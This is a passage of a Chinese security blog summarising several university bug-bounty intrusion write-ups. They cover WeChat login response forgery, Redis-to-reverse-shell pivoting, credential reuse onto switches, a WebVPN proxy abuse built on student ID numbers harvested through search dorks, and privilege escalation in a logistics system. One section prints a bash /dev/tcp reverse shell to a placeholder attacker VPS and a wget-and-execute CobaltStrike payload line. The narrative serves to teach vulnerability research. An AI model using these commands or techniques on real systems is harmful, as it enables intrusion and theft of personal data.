+<p>首先开展常规信息收集时发现目标站点存在仅支持微信客户端打开的访问限制，页面直接返回 “请在微信客户端打开链接” 的拦截提示，测试者随即通过浏览器 F12 开发者工具切换至移动端模拟视图，并将请求 UA 头替换为微信内置浏览器的对应标识，成功绕过客户端校验进入站点的体检业务页面。</p>
+<p>随后对站点进行目录扫描，定位到一处后台登录入口，测试者先尝试 edu 站点常见的修改登录响应包越权手法，抓取登录请求后将返回包中的 <code>success</code> 字段改为 <code>true</code>、返回提示改为登录成功，但多次调整均无法成功进入后台，于是转向接口层面的信息梳理。</p>
+<p>在站点的接口列表（熊猫头）中发现了 <code>UserInfoByOpenId</code> 这一用户信息查询接口，对该接口发起测试后返回 <code>openid</code> 为空或未定义的报错，同时也暴露了接口统一的返回数据格式。</p>
+<p>此时测试者结合站点仅支持微信访问的特性展开思路推导，意识到这类依赖微信生态的站点通常会通过微信 <code>openid</code> 进行用户身份识别与自动登录，用户在微信内访问时站点会直接获取对应微信账号的 <code>openid</code> 完成身份校验。</p>
+<p>于是测试者使用 Proxifier 工具对微信客户端的网络流量进行抓包，在微信内置浏览器中访问目标站点，发现站点在用户未进行任何登录操作的情况下，就会自动请求并返回包含当前微信用户 <code>openid</code> 在内的用户信息数据，测试者将该响应中的 <code>returnData</code> 数据结构完整记录下来。</p>
+<p>随后回到后台登录页面再次抓取登录请求，沿用修改响应包的思路，将登录接口的返回数据替换为此前记录的用户信息结构，同时将 <code>success</code> 字段置为 <code>true</code>，并将返回数据中的身份证号、姓名等身份字段修改为 <code>admin</code> 相关值，保持整体数据格式对齐后放行数据包，最终成功越权进入后台管理系统。</p>
+<p>进入后台后发现页面无数据展示，再次通过抓包调取后台数据接口，最终获取到站点的全部数据，完成整个证书站的漏洞利用与权限突破。</p>
+<hr>
+<h2 id="0x0D-EDU-内网攻防——H3C-telnet-弱口令-→-NAT-端口映射打点-→-Redis-未授权反弹-→-密码复用横向拿下交换机"><a href="#0x0D-EDU-内网攻防——H3C-telnet-弱口令-→-NAT-端口映射打点-→-Redis-未授权反弹-→-密码复用横向拿下交换机" class="headerlink" title="0x0D EDU 内网攻防——H3C telnet 弱口令 → NAT 端口映射打点 → Redis 未授权反弹 → 密码复用横向拿下交换机"></a>0x0D EDU 内网攻防——H3C telnet 弱口令 → NAT 端口映射打点 → Redis 未授权反弹 → 密码复用横向拿下交换机</h2><p>在本次 EDU 场景的漏洞挖掘过程中，攻击者拿到目标资产表后首先启动全量信息收集阶段，先用 fscan 对分配的目标做快速资产识别，初步扫过后发现可用外网资产不多，仅记录到一处内网地址泄露的信息，同时确认目标内网存在大量视频监控类设备。</p>
+<p>在外网直接打点收益有限的情况下，攻击者转向弱口令突破路径，使用弱口令检测工具对暴露的服务做批量爆破，成功爆破出一台 H3C 网络设备的 telnet 管理员口令，登陆设备后发现其自带 SSL VPN 功能与授权，最初的思路是通过配置 SSL VPN 直接打通内网访问隧道，但该设备型号过于老旧，无论是命令行参照官方手册配置，还是通过 web 界面调试，都始终无法成功建立 VPN 连接。</p>
+<p>在这个单点耗费近一小时无果后，攻击者及时调整攻击思路，转而利用已拿到的路由器管理员权限做进一步内网探测，先通过查看设备路由表梳理出内网 2、3、5、6 共四个网段，再借助设备自带的 telnet、ping 能力探测网段首尾 IP 的端口开放情况，以此判断出 2 网段为服务器区、5 网段包含服务器与无线 AP 设备，3 网段属性暂不明确。</p>
+<p>随后攻击者登陆了 5 网段的一台无线 AP，发现设备仅支持 <code>ifconfig</code>、<code>ps</code> 等少量命令，其余命令均被屏蔽，web 端功能也十分有限，未找到可利用漏洞，查阅厂商手册得知同系列无线网关支持 VPN 功能后尝试寻找网关设备但未能定位，便彻底放弃 VPN 打通的路径，改用 “端口映射 + 脆弱端口探测” 的路径。</p>
+<p>依托路由器的 NAT 端口映射能力，针对已确认的服务器网段 2 段，逐个探测 22、1433、3389、6379、7001 等常见脆弱端口，每发现开放端口就通过路由器将其映射到公网做后续利用。最开始探测 22 端口做 SSH 弱口令爆破全程无果，继续扩大探测范围后发现一台主机开放 6379 Redis 端口，在路由器 telnet 环境下验证未授权访问表现异常，将端口映射到公网后确认该 Redis 存在未授权访问漏洞，随即使用 fscan 通过 Redis 写入计划任务的方式反弹 shell 到公网 VPS，成功拿到第一台内网主机权限，撕开了内网突破口。</p>
+<p>进入内网横向阶段后，攻击者沿用密码复用的思路，用已收集到的密码通过 fscan 批量撞库内网 B 段的 3389 远程桌面端口，成功拿下两台主机权限，同时在内网批量探测向日葵 RCE 漏洞，筛选出可正常执行命令的主机后用 PowerShell 将其上线到 CS。</p>
+<p>登陆服务器后按常规路径翻查本地文件、导出浏览器保存的密码、检索管理员登陆日志定位管理端 IP，利用找到的数据库账号成功连入数据库，还从浏览器凭据中获取到上网行为管理系统的账号密码并登陆后台，除此之外，将已获取的密码批量尝试内网交换机设备的登陆权限，最终拿下 8 台交换机的控制权。</p>
+<p>后续攻击者又用 kscan 做更全面的内网端口扫描，发现大量移动终端开放 ADB 端口，批量连接后覆盖了物联网类资产的得分上限。</p>
+<p>全程中攻击者多次调整攻击思路，从死磕 SSL VPN 配置转向端口映射打点，避免在单一攻击路径上过度消耗时间，同时也总结出 EDU 场景下信息收集要尽可能宽泛全面、内网横向要善用密码复用、遇到瓶颈及时切换突破口的挖掘经验，也意识到团队协作中信息同步、多思路碰撞能有效避免钻牛角尖，提升漏洞挖掘的效率。</p>
+<p>文章连接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk1NzgzMjkxOQ==&mid=2247485953&idx=1&sn=82b97bc337ad7da54d586a7efe55c5a6&chksm=c3d901b9f4ae88af9bf681d781c3317904f29575572a4d423d8362676314fd31b8eb6d441fac&cur_album_id=4144224985717932037&scene=189#wechat_redirect">记一次edu攻防</a></p>
+<hr>
+<h2 id="0x10-WebVPN-内网穿透——Google-Hack-批量获取师生凭据-URL-规则逆向全端口探测-宝塔弱口令上线-CS"><a href="#0x10-WebVPN-内网穿透——Google-Hack-批量获取师生凭据-URL-规则逆向全端口探测-宝塔弱口令上线-CS" class="headerlink" title="0x10 WebVPN 内网穿透——Google Hack 批量获取师生凭据 + URL 规则逆向全端口探测 + 宝塔弱口令上线 CS"></a>0x10 WebVPN 内网穿透——Google Hack 批量获取师生凭据 + URL 规则逆向全端口探测 + 宝塔弱口令上线 CS</h2><p>本次针对高校站点的漏洞挖掘与渗透全程以信息收集为核心突破口。</p>
+<p>攻击者首先围绕目标 edu 域名展开多维度信息搜集，一方面运用 Google Hack 语法 <code>filetype:xls site:xxx.edu.cn 身份</code> 批量检索站点公开的 Excel 文件，从返回结果中筛选出教职工迁户材料、应聘人员汇总表、学生名单等多份包含身份证号、学号字段的文档，下载核验后获取了大量有效的师生身份凭证；另一方面借助 ARL 灯塔工具完成全量资产测绘，梳理出目标的子域名、开放端口与服务指纹，在资产列表中发现 WebVPN 系统，立刻判定其为进入内网的关键入口。</p>
+<p>随后攻击者利用从 Excel 文件中提取的身份证号与学号组合，成功登录 WebVPN 系统，登录后发现系统仅开放了少量可点击应用，但在观察应用跳转的 URL 时发现了明显的格式规律，地址结构为 <code>http://[目标地址替换为横杠分隔的字符串].xxx.xxx.edu.cn:8118/</code>。</p>
+<p>为验证这一 URL 改写规则，攻击者主动将外网站点 <code>2021.ip138.com</code> 转换为 <code>2021-ip138-com</code> 的格式拼接进 URL，访问后确认该 WebVPN 可通过自定义 URL 拼接的方式代理访问任意地址。</p>
+<p>在此基础上，攻击者在抓包分析学校官网前端请求时，意外发现响应中泄露了内网 IP 地址 <code>10.30.252.33</code>，随即按照已掌握的规则将该内网 IP 拼接进 WebVPN 地址尝试访问，首次访问失败后，攻击者判断该地址所属的 <code>10.30.252.0/24</code> 网段为校园服务器网段，转而对 C 段地址进行逐个遍历探测，当探测至 <code>10.30.252.23</code> 时页面可正常访问，证实了 WebVPN 具备内网代理探测的能力，但此时仍无法自定义访问端口与 HTTPS 协议。</p>
+<p>为补齐这一能力，攻击者使用 <code>site:xxx.xxx.edu.cn:8118</code> 语法检索该端口下的历史 URL 记录，发现了带有 <code>-8090-p</code> 与 <code>-s</code> 后缀的地址样例，由此推导出完整的 URL 构造规则：</p>
+<ul>
+<li>在目标地址字符串后追加 <code>-端口号-p</code> 即可指定访问端口</li>
+<li>追加 <code>-s</code> 则可启用 HTTPS 协议访问</li>
+</ul>
+<p>至此攻击者掌握了灵活的内网资产探测能力，可对内网不同主机的不同端口、不同协议进行手工探测。</p>
+<p>在持续的内网探测中，攻击者发现某内网主机开放了宝塔面板管理端口，尝试 <code>admin/admin</code> 的经典弱口令组合后成功登入面板后台。获取面板权限后，攻击者利用宝塔的任务计划功能构造反弹 Shell payload：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击者VPS_IP/监听端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>通过计划任务定时执行该命令，成功与攻击者的 VPS 建立交互式 Shell 连接，拿到目标服务器的操作权限。</p>
+<p>为维持长期控制，攻击者继续在 Shell 中执行命令，通过以下方式从自建 VPS 下载 CobaltStrike 的 Linux 后门程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://VPS_IP:端口/SHELLCODE &amp;&amp; <span class="built_in">chmod</span> +x SHELLCODE &amp;&amp; ./SHELLCODE</span><br></pre></td></tr></table></figure>
+
+<p>赋予执行权限后运行，最终使目标内网服务器成功上线 CobaltStrike 控制端，完成了从外部公开信息泄露到内网服务器权限获取的完整渗透流程。</p>
+<p>整个过程本质是将分散的信息泄露点逐步串联，从公开数据到入口突破、再到内网规则摸索、最终权限获取，每一步都依托对已有信息的深度挖掘与逻辑推导实现。</p>
+<p>文章连接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk1NzgzMjkxOQ==&mid=2247486038&idx=1&sn=9cb6015f1335927ac65406980fbb528a&chksm=c3d901eef4ae88f855a6e13e343373b6e73965765dbd9565b57b5c8d1e55e8895f8a5a4df860&cur_album_id=4144224985717932037&scene=189#wechat_redirect">记一次edu漏洞挖掘&#x2F;从信息泄露到内网渗透</a></p>
+<hr>
+<h2 id="0x0F-后勤管理系统漏洞链——弱口令直取超管-→-Cookie-替换绕过前端权限拦截-→-删除账号不失效的隐形后门"><a href="#0x0F-后勤管理系统漏洞链——弱口令直取超管-→-Cookie-替换绕过前端权限拦截-→-删除账号不失效的隐形后门" class="headerlink" title="0x0F 后勤管理系统漏洞链——弱口令直取超管 → Cookie 替换绕过前端权限拦截 → 删除账号不失效的隐形后门"></a>0x0F 后勤管理系统漏洞链——弱口令直取超管 → Cookie 替换绕过前端权限拦截 → 删除账号不失效的隐形后门</h2><p>本次针对高校资产的漏洞挖掘始于常态化的脆弱资产测绘，攻击者在周末通过 ARL 灯塔工具梳理高校域名资产，摒弃信息泄露类的常规挖掘方向，转而在站点标题维度检索 “系统、注册、登录” 等关键词快速定位脆弱目标，最终锁定了一个校园后勤类 xx 管理系统的登录入口。</p>
+<p>面对登录框，攻击者结合 EDU 场景的漏洞价值特性，先排除了 URL 重定向、反射型 XSS 这类低价值 “水洞”，优先测试弱口令、未授权访问、信息泄露、返回包绕过等高效突破思路，在观察到页面默认回显账号为 <code>qyxx</code>、密码栏呈现四位掩码的特征后，基于高校后勤管理系统常存在账号与密码一致的弱口令配置惯例，直接推测密码与账号同名，使用 <code>qyxx/qyxx</code> 的凭据尝试登录，成功进入系统后台。</p>
+<p>且该账号是系统唯一的超级管理员账户，拥有校园内吹风机、洗衣机等共享设备的开关控制、消费金额调整等全部管理权限，后台还存储着数千条居民身份证等敏感个人信息，仅这一处弱口令漏洞就达到 6rank 的评级。</p>
+<p>拿到超管权限后，攻击者继续深度挖掘后台的权限控制缺陷，针对垂直越权开展测试：</p>
+<ol>
+<li>以超管身份进入操作员添加功能页，创建仅授予运营模式管理权限的低权限 <code>admin</code> 账户，同时抓取创建用户时的完整 HTTP 请求包存入 Burp 的 Repeater 模块</li>
+<li>切换到 <code>admin</code> 账号登录，验证前端界面已屏蔽新增用户的功能入口、低权限用户无创建用户的前端权限</li>
+<li>按照垂直越权的标准测试逻辑，将请求包中原超级管理员 <code>qyxx</code> 的 Cookie 替换为低权限 <code>admin</code> 的 Cookie 后重放请求，成功创建出 <code>admin1</code> 用户</li>
+</ol>
+<p>证实系统后端未对用户权限做校验，仅靠前端做权限拦截，存在垂直越权漏洞，且该漏洞可延伸至删除用户、金额管理等所有超管功能点，甚至可以先抓取超管创建最高权限账户的请求包，再用低权限账号的 Cookie 重放请求，直接越权生成超级管理员账户实现权限完全逃逸。</p>
+<p>完成越权漏洞验证后，攻击者进一步测试系统的会话管理逻辑：</p>
+<ol>
+<li>以超管身份创建 <code>admin2</code> 测试账号，在另一浏览器中使用 <code>admin2</code> 完成登录保持会话</li>
+<li>回到超管后台将 <code>admin2</code> 账号从用户列表中删除</li>
+<li>切换到 <code>admin2</code> 的登录页面刷新，发现账号不仅没有被强制下线，还能正常查看所有敏感信息</li>
+<li>甚至可以继续借助垂直越权的逻辑创建新的 <code>admin3</code> 用户，且新创建的 <code>admin3</code> 账号也能正常登录系统</li>
+</ol>
+<p>由此验证系统存在严重的会话逻辑缺陷：用户被管理员删除后，只要客户端不主动退出登录，已签发的会话 Cookie 就始终保持有效、永不过期。攻击者可以利用这一缺陷创建高权限账号后主动让管理员删除，留存一个管理员在用户列表中完全感知不到的隐形后门账户，长期维持对系统的控制。</p>
+<p>整套挖掘流程从资产定位到弱口令突破，再到后台权限与逻辑漏洞的纵深挖掘，最终收获一个高危加两个中危的漏洞评级。</p>
+<p>文章连接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk1NzgzMjkxOQ==&mid=2247486077&idx=1&sn=f133d6336e7500174bcb6aa42284a328&chksm=c3d901c5f4ae88d3eb9ad92cc6c123536495f2cbdd60cb66de3f9ee2841f7c032be8307e036e&cur_album_id=4144224985717932037&scene=189#wechat_redirect">记一次edusrc7rank的简单挖掘</a></p>
+<hr>
+
+		  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+
+		  <script>
+		    // 计算字数与阅读时长，同时更新阅读进度条
+		    (function() {
+		      var content = document.querySelector('.mypage');
+		      if (content) {
+		        var text = content.innerText || content.textContent;
+		        // 中文字符（含 CJK 扩展区 + 标点），按字符计数
+		        var chineseChars = (text.match(/[一-鿿㐀-䶿豈-﫿　-〿＀-￯]/g) || []).length;
+		        // 英文/数字按字符计（非词），与 CSDN 统计方式一致
+		        var latinChars = (text.match(/[a-zA-Z0-9]/g) || []).length;
+		        var wordCount = chineseChars + latinChars;
+		        // 阅读时长：中文约 300 字/分钟，英文约 200 词/分钟
+		        var englishWords = (text.match(/[a-zA-Z0-9]+/g) || []).length;
+		        var readingTime = Math.max(1, Math.ceil(chineseChars / 300 + englishWords / 200));
+		        var wcEl = document.getElementById('word-count');
+		        var rtEl = document.getElementById('reading-time');
+		        if (wcEl) wcEl.textContent = '~' + wordCount + ' 字';
+		        if (rtEl) rtEl.textContent = '约 ' + readingTime + ' 分钟';
+		      }
+		      // 阅读进度条
+		      var bar = document.getElementById('reading-progress-bar');
+		      if (bar) {
+		        window.addEventListener('scroll', function() {
+		          var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+		          var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+		          var progress = docHeight > 0 ? Math.min(100, (scrollTop / docHeight) * 100) : 0;
+		          bar.style.width = progress + '%';
+		        });
+		      }
+		    })();
+		  </script>
+		</div>
+
+		
+		<span id="" class="leancloud-visitors view" data-flag-title="漏洞挖掘场景">
+			<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+		</span>
+		
+		
+		<div>
+	  	<center>
+
+		<div class="pagination">
+
+    
+</div>
+
+
+	    </center>
+		</div>
+
+		<!-- comment -->
+		
+			<section id="comments" class="comments">
+				<style>
+				.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+				@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+				</style>
+				<div id="vcomment" class="comment"></div>
+<script>
+// 延迟加载评论系统
+window.addEventListener('load', function() {
+  setTimeout(function() {
+    var script = document.createElement('script');
+    script.src = 'https://unpkg.com/valine@1.5.1/dist/Valine.min.js';
+    script.onload = function() {
+      var valineConfig = {"enable":true,"appId":"22F2XnoONZRtEbXvXO1SDcjS-gzGzoHsz","appKey":"bIFSRG6LeUO90VdfRBHUXNQs","placeholder":"说点什么吧~","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+      valineConfig.el = '#vcomment';
+      valineConfig.recordIP = true;
+      valineConfig.serverURLs = 'https://22f2xnoo.api.lncldglobal.com';
+      new Valine(valineConfig);
+    };
+    document.head.appendChild(script);
+  }, 1000); // 延迟1秒加载
+});
+</script>
+			</section>
+		
+		
+		
+		</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+		<div id="side_meta">
+			<div class="col-md-3 sticky-meta" id="post_meta"> 
+
+	<!-- small fixed card (date + brief meta) -->
+	<div class="top-card">
+		<!-- date -->
+		
+		<div class="meta-widget">
+		<i class="fa fa-clock-o"></i>
+		2026-03-09
+		</div>
+		
+
+		<!-- brief categories/tags inside fixed card -->
+		
+		<div class="meta-widget small-cats">
+			<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>
+			<ul id="categorys" class="tag_box list-unstyled collapse in">
+				  
+  <li>
+    <li><a href="/categories/网络安全/">网络安全<span>44</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/">SRC&渗透<span>11</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/SRC/">SRC<span>4</span></a></li>
+  </li>
+
+			</ul>
+		</div>
+		
+
+		
+		<div class="meta-widget small-tags">
+			<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+			<ul id="tags" class="tag_box list-unstyled collapse in">
+				  
+  <li><a href="/tags/SRC/">SRC<span>4</span></a></li>
+			</ul>
+		</div>
+		
+	</div>
+
+	<!-- All Categories: sticky within sidebar area -->
+	<div class="category-stick" id="category-stick">
+		
+<div class="widget-wrap">
+  <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
+  <div class="widget category-tree">
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/AI/">AI</a><span class="hacker-category-list-count">1</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/AI/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">39</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/SRC/">SRC</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">3</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">20</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">6</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">12</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">8</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+  </div>
+</div>
+
+
+<style>
+/* Hacker / Terminal Style Category Tree */
+.category-tree .hacker-category-list {
+  padding-left: 20px;
+  font-family: 'Consolas', 'Courier New', monospace;
+  color: #fff;
+  list-style-type: circle; /* 'o' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list {
+  list-style-type: square; /* '■' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list .hacker-category-list {
+  list-style-type: square;
+}
+
+.category-tree .hacker-category-list-item {
+  margin: 6px 0;
+}
+
+.category-tree .hacker-category-list-link {
+  background-color: rgba(43, 188, 138, 0.1);
+  color: #2bbc8a;
+  text-decoration: none;
+  padding: 1px 6px;
+  font-weight: bold;
+  display: inline-block;
+}
+
+.category-tree .hacker-category-list-link:hover {
+  background-color: rgba(43, 188, 138, 0.2);
+  text-decoration: none;
+}
+
+.category-tree .hacker-category-list-count {
+  color: #2bbc8a;
+  margin-left: 5px;
+}
+</style>
+
+	</div>
+
+	<!-- article TOC placed below the category list; should scroll with page -->
+	<div class="toc-wrapper">
+		<div class="toc-widget">
+		
+			 <div class="toc">
+				 <span class="toc-title"><i class="fa fa-list"></i> Contents</span>
+				<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x01-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3-type-%E5%8F%82%E6%95%B0-SQL-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E2%80%94%E2%80%94if-1-1-sleep-2-1-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-article-text">0x01 小程序接口 type 参数 SQL 时间盲注——if(1&#x3D;1,sleep(2),1) 延时注入</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x02-%E5%B0%8F%E7%A8%8B%E5%BA%8F-AES-%E5%8A%A0%E5%AF%86-id-%E5%8F%82%E6%95%B0%E8%B6%8A%E6%9D%83%E2%80%94%E2%80%94%E9%80%86%E5%90%91%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%89%B9%E9%87%8F%E9%81%8D%E5%8E%86%E6%8B%BF%E4%B8%8B%E5%8D%81%E4%B8%87%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-article-text">0x02 小程序 AES 加密 id 参数越权——逆向反编译 + 批量遍历拿下十万用户敏感信息</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x03-Oracle-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-WAF-%E7%BB%95%E8%BF%87%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE-%E6%B3%A8%E9%87%8A%E5%B9%B2%E6%89%B0-%E6%89%8B%E5%B7%A5%E8%84%9A%E6%9C%AC%E7%AA%81%E7%A0%B4"><span class="toc-article-text">0x03 Oracle 报错注入 WAF 绕过——垃圾数据 &#x2F;**&#x2F; 注释干扰 + 手工脚本突破</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x04-%E6%B0%B4%E7%94%B5%E8%B4%B9%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9D%EF%BC%88RuoYi%EF%BC%89%E6%A1%86%E6%9E%B6%E5%9B%BA%E5%AE%9A%E8%B7%AF%E5%BE%84%E5%88%A9%E7%94%A8"><span class="toc-article-text">0x04 水电费小程序未授权访问——若依（RuoYi）框架固定路径利用</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x05-Spring-Boot-%E6%95%8F%E6%84%9F%E7%AB%AF%E7%82%B9%E6%8E%A2%E6%B5%8B%E2%80%94%E2%80%94-env-%E4%B8%8E-heapdump-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8"><span class="toc-article-text">0x05 Spring Boot 敏感端点探测——&#x2F;env 与 &#x2F;heapdump 信息泄露利用</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" 